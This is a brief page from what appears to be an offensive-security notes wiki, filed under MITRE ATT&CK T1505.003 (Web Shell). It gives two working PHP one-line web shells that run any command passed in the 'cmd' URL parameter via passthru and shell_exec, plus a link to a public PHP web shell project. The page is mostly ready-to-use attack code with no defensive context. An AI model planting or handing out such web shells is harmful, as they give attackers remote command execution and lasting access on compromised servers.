---
description: MITRE ATT&CK, Persistence, Sub-technique T1505.003
---

# Web Shell

### Basic Web Shells

#### PHP

```bash
<?php echo passthru($_GET['cmd']); ?>
```

```bash
<?php echo shell_exec($_GET['cmd']); ?>
```

{% embed url="https://github.com/WhiteWinterWolf/wwwolf-php-webshell" %}
